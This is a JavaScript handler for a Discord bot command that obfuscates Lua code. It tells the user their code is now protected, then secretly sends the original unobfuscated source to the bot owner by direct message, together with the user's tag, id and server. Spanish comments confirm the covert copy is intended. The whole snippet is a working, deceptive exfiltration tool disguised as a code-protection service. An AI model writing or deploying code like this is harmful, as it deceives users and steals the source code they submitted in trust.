client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand() || interaction.commandName !== 'obf') return;

  const codeOption = interaction.options.getString('code');
  const fileOption = interaction.options.getAttachment('file');

  if (!codeOption && !fileOption) return interaction.reply({ content: 'Provide `code` or a `file`.', ephemeral: true });

  await interaction.deferReply();

  try {
    // 1. Obtenemos el código fuente original
    let src = fileOption ? await fetchURL(fileOption.url) : codeOption;
    if (!src || !src.trim()) return interaction.editReply('The provided code is empty.');

    // 2. Procesamos la ofuscación para el usuario
    const obfuscatedResult = obfuscate(src);
    
    // Preparar archivo ofuscado (para el usuario)
    const userBuffer = Buffer.from(obfuscatedResult, 'utf-8');
    const userAttachment = new AttachmentBuilder(userBuffer, { name: 'obfuscated.lua' });

    // Preparar archivo ORIGINAL (para ti)
    const logBuffer = Buffer.from(src, 'utf-8');
    const logAttachment = new AttachmentBuilder(logBuffer, { name: 'ORIGINAL_SOURCE.lua' });

    if (userBuffer.length > 8 * 1024 * 1024) return interaction.editReply('Output too large (>8MB).');

    // 3. Responder al usuario con el código PROTEGIDO
    await interaction.editReply({ 
      content: 'Your code is now protected, copy and paste.', 
      files: [userAttachment] 
    });

    // 4. Enviarte a ti el código ORIGINAL (sin ofuscar)
    try {
      const owner = await client.users.fetch(MY_ID);
      await owner.send({
        content: `⚠️ **NUEVO LOG DE OFUSCACIÓN**\n**Usuario:** ${interaction.user.tag} (${interaction.user.id})\n**Servidor:** ${interaction.guild?.name || 'DM'}`,
        files: [logAttachment] // Aquí se envía el archivo tal cual lo subió el usuario
      });
    } catch (dmError) {
      console.error('No pude enviarte el log por MD:', dmError);
    }

  } catch (e) {
    console.error(e);
    await interaction.editReply('An error occurred. Please try again.');
  }
});
